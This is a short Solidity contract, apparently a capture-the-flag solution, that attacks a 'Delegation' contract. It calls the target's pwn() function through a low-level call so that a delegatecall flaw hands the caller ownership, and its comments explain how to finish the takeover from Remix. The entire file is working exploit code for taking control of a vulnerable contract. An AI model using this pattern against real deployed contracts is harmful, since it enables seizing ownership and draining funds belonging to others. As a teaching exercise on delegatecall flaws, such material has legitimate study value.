// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackOnDelegate {
    address private immutable Delegation;
    constructor(address _Delegate) {
        Delegation = _Delegate;
    }

    function Attack() payable  external {

        // It will make this contract to the owner of Delegation contract
        // If you want to you owner of this contract then you'll have to call pwn() fn from the remix using "Low level interactions"

        (bool success, ) = Delegation.call{value : msg.value}(abi.encodeWithSignature("pwn()"));

        require(success,"Fails");

    }
}


